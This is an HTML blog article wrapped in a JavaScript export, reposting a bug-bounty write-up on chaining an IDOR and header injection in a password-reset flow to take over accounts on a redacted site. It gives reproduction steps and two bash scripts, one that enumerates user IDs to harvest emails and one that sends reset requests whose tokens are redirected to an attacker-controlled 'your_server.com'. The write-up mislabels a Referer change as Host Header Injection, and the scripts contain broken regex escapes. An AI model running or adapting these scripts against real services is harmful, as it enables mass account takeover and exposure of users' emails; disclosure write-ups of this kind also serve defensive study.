export const content = `<h1><strong>Chaining IDOR and Host Header can takeover 18 Million of users account</strong></h1><img src="https://miro.medium.com/v2/resize:fit:1050/1*R901O9TvwVZnNk0E_ZCvQA.png" alt=""><p>This blog article discusses a security flaw that was found in the password reset feature of <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a>. The flaw unintentionally exposes user email addresses through Insecure Direct Object References (IDOR). Additionally there is another vulnerability called Host Header Injection, which increases the risk of mass account takeovers.</p><blockquote><p>Credit: This Blog is originally published by Sahil Mehra on Medium <a target="_blank" rel="noopener noreferrer nofollow" href="https://medium.com/@nullr3x/chaining-idor-and-host-header-can-takeover-18-million-of-users-account-39d402f6a79e">link here</a></p></blockquote><h2><strong>(FIRST) IDOR in Password Reset Functionality</strong></h2><p>The first bug discovered involves an Insecure Direct Object Reference (IDOR) within the password reset functionality of <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a>. The steps to reproduce this vulnerability are as follows:</p><ul><li><p>Navigate to “<a target="_blank" rel="noopener noreferrer nofollow" href="https://redacted.com/reset">https://redacted.com/reset</a>."</p></li><li><p>Enter your email address and intercept the request.</p></li><li><p>In the request I see two parameters, “email” and “id” parameters.</p></li><li><p>No change in the email parameter (because email parameter doesn’t matter to fetch victim’s email) but modify the “id” parameter value.</p></li><li><p>The response will reveal the victim’s email address associated with the manipulated user ID.</p></li></ul><h2><strong>(SECOND) Host Header Injection in Password Rest Functionality</strong></h2><p>Second vulnerability Host Header Injection was identified in the password reset functionality. This injection, when combined with the IDOR bug, opens the door to potential mass account takeovers. Follow these steps:</p><ul><li><p>Copy the victim’s email obtained through the IDOR exploit.</p></li><li><p>Paste the victim’s email into the email address field and intercept the request.</p></li><li><p>Change the Referer header from “<a target="_blank" rel="noopener noreferrer nofollow" href="https://redacted.com">https://redacted.com</a>" to “<a target="_blank" rel="noopener noreferrer nofollow" href="https://your_Server.com">https://your_Server.com</a>."</p></li><li><p>And the reset password token will sent to your server for the Victim’s account.</p></li></ul><h2><strong>(THIRD) The Result: Mass Account Takeover</strong></h2><p>Through these actions hackers are able to obtain the password reset link, for every individuals account. This ultimately results in a mass takeover of accounts, on the <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a> platform.</p><h2><strong>Automate this process by two steps</strong></h2><h3><strong>First Step</strong></h3><p>Creating wordlist of victim’s email by using this simple bash script for getting active user emails and make a list for next step:</p><pre><code>#!/bin/bash

url="https://redacted.com/reset"
output_file="output.txt"

email_regex="[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+.[A-Z|a-z]{2,}"

for ((id=1; id&lt;=10000; id++)); do
    response=$(curl -s -X POST $url --data "email=&amp;id=$id")
    email=$(echo "$response" | grep -oP "$email_regex")
    
    if [ -n "$email" ]; then
        echo "ID: $id -&gt; Email: $email &gt;&gt; "$output_file"
    fi
done</code></pre><h3><strong>Second Step</strong></h3><p>Using the email wordlist request for password against each email address using this bash script will capture the reset password tokens for each email we collected from first step:</p><pre><code>#!/bin/bash

input_file="output.txt"

your_server="https://your_server.com"

while IFS= read -r line; do
    id=$(echo "$line" | grep -oP 'ID: K[0-9]+')
    email=$(echo "$line" | grep -oP 'Email: K[^,]+')

    response=$(curl -s -X POST https://redacted.com/reset --data "email=$email&amp;id=$id" -H "Referer: $your_server")

    echo "ID: $id -&gt; Reset Token Sent for $email"
done &lt; "$input_file"</code></pre><h2><strong>The Result: Mass Account Takeover</strong></h2><p>Through these actions hackers are able to obtain the password reset link, for every individuals account.</p><p><strong><em>The server will only send reset password link when Email and User ID match otherwise it disclosed the email associated with the User ID.</em></strong></p><p>This ultimately results in a mass takeover of accounts, on the <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a> platform.</p><h2><strong>Impact</strong></h2><ul><li><p>Exploiting the IDOR vulnerability reveals user emails, while the Host Header Injection allows attackers to intercept reset password links, leading to mass disclosure.</p></li><li><p>The chaining of IDOR and Host Header Injection leads to mass account takeovers, granting unauthorized access to sensitive user data and activities.</p></li><li><p>The fallout from a mass account takeover and data breach can incur substantial financial losses, including costs for incident response, legal actions, and operational disruptions for <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a>.</p></li><li><p>Successful exploitation of these vulnerabilities can severely damage <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a>’s reputation, eroding user trust in the platform’s security measures.</p></li></ul><h2><strong>Mitigation</strong></h2><p>To protect against these vulnerabilities <a target="_blank" rel="noopener noreferrer nofollow" href="http://redacted.com">redacted.com</a> should consider implementing the following measures:</p><ul><li><p>Strengthen input validation mechanisms, for verifying inputs to avoid any tampering with parameters.</p></li><li><p>Enhance session management practices to detect and prevent unauthorized access.</p></li><li><p>Implement strict validation of Host headers to mitigate Host Header Injection risks</p></li></ul><p>Thank you for taking the time to read this article!</p>`